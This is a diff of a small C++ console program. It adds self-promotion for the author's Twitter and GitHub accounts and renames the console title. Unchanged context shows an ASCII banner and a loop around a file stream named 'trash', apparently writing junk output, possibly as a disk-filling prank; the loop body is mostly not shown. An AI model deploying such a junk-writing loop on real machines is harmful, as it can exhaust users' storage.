@@ -6,14 +6,23 @@ using namespace std;
 
 int main()
 {
+
+	/*
+	follow @Innocentkys on Twitter 
+	& 
+	@Innocent1337 on GitHub :-)
+	*/
+
 	cout << " _                           .____             " << endl;
 	cout << " | , __   , __     __.       /     ,   . , __  " << endl;
 	cout << " | |'  `. |'  `. .'   \      |__.  |   | |'  `." << endl;
 	cout << " | |    | |    | |    |      |     |   | |    |" << endl;
 	cout << " / /    | /    |  `._.'      /     `._/| /    |" << endl;
 	cout << "                                               " << endl;
+	cout << " " << endl;
+	cout << "Follow https://twitter.com/Innocentkys" << endl;
 
-	SetConsoleTitleA("Inno Fun");
+	SetConsoleTitleA("Innocents.eu");
 
 	int value = 1;
 	ofstream trash;
@@ -24,5 +33,4 @@ int main()
 		value++;
 	}
 	trash.close();
-
 }
